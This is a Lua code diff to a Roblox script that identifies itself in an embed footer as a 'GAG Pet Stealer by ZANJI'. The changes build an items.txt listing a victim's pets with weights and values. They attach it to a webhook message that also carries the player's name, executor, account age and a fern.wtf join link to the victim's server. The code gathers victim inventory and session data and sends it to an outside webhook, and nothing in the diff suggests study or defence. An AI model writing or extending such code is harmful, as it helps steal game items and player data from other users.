@@ -327,7 +327,7 @@
         local teleportDisplay = string.format('%s | %s', placeId, jobId)
         local joinUrl = string.format("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s", placeId, jobId)
 
-        -- Pet list formatting
+        -- Pet list formatting for embed
         local petLines = {}
         for _, item in ipairs(list) do
             if item.Type == "Pet" then
@@ -339,6 +339,20 @@
             end
         end
         local petListStr = table.concat(petLines, "\n")
+
+        -- Create items.txt content with all pets
+        local itemsTxtContent = ""
+        for _, item in ipairs(list) do
+            if item.Type == "Pet" then
+                -- Extract base pet name without emoji prefix for the file
+                local baseName = item.Name:gsub("^[^%s]+%s%-%s", "") -- Remove emoji and dash
+                itemsTxtContent = itemsTxtContent .. string.format("%s - %s [%.2f KG] → %s¢\n", 
+                    getPetEmoji(baseName, item.Weight), 
+                    baseName, 
+                    item.Weight, 
+                    formatNumber(item.Value))
+            end
+        end
 
         -- Main embed description with Discord formatting
         local playerInfoSection = string.format("```Name: %s\nExecutor: %s\nAccount Age: %s days\nPlayers in game: %s/%s```", playerName, executor, "72", playerCount, maxPlayers)
@@ -363,7 +377,11 @@
                     ["text"] = "🐕 GAG Pet Stealer by ZANJI"
                 },
                 ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
-            }}
+            }},
+            ["file"] = {
+                ["name"] = "items.txt",
+                ["content"] = itemsTxtContent
+            }
         }
 
         return sendWebhook(data)
